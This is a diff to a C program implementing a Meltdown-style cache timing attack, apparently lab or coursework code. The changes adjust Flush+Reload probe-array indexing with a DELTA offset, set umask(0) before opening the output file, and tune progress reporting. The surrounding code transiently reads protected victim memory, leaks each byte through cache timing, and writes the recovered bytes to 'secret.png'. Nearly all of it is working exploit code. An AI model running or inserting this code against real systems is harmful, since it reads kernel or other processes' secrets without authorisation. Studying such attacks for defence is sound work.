@@ -43,7 +43,7 @@ void probe() {
 
 	int i;
 	for(i=0; i<PROBE_N; i++) {
-		addr = &probe_array[i * PAGE_SIZE]; 
+		addr = &probe_array[i * PAGE_SIZE + DELTA]; 
 		start = __rdtscp(&junk); // read time stamp before the memory read
 		junk = *addr; // read value
 		total_cycles = __rdtscp(&junk) - start;	
@@ -82,7 +82,8 @@ int main(int argc, char* argv[]) {
 		return 1;	
 	}
 
-	int img = open("secret.png", O_WRONLY|O_CREAT); // write obtained bytes here
+	umask(0); // removes restrictions on secret image
+	int img = open("secret.png", O_RDWR|O_CREAT); // write obtained bytes here
 	if(img < 0) {
 		perror("Failed to create image file.\n");
 		return -1;
@@ -123,13 +124,13 @@ int main(int argc, char* argv[]) {
 			
 			// initialize the probe_array
 			for(i=0; i<PROBE_N; i++) { // only going down a single column in probe array ; these are the only elements we access
-				probe_array[i * PAGE_SIZE] = 1;	
+				probe_array[i * PAGE_SIZE + DELTA] = 1;	
 			}
 
 			// flush probe_array from CPU cache
 			for(i=0; i<PROBE_N; i++) {
 				// invalidates and flushes the cache line that contains the address from all caches in the cache hierarchy
-				_mm_clflush(&probe_array[i * PAGE_SIZE]);
+				_mm_clflush(&probe_array[i * PAGE_SIZE + DELTA]);
 			}		
 			
 			// bring victim data into the cache
@@ -150,7 +151,7 @@ int main(int argc, char* argv[]) {
 				);
 
 				byte = *(unsigned char*)addr;
-				probe_array[byte * PAGE_SIZE] = 1; 
+				probe_array[byte * PAGE_SIZE + DELTA] = 1; 
 				printf("Muahaha, I got the secret: %c\n", byte); // should never execute
 			}
 			probe(); 
@@ -190,7 +191,7 @@ int main(int argc, char* argv[]) {
 
 		//printf("Guess: %c (%i) ; %i hits out of %i iterations)\n", guess, guess, scores[guess], ITER_N);
 		addr++; // move to next char
-		if(c % 4096 == 0) {
+		if(c % 512 == 0) {
 			end = clock();
 			total_time = ((double) (end - start)) / CLOCKS_PER_SEC;
 			printf("%.2f seconds elapsed: probed %i bytes.\n", total_time, c);
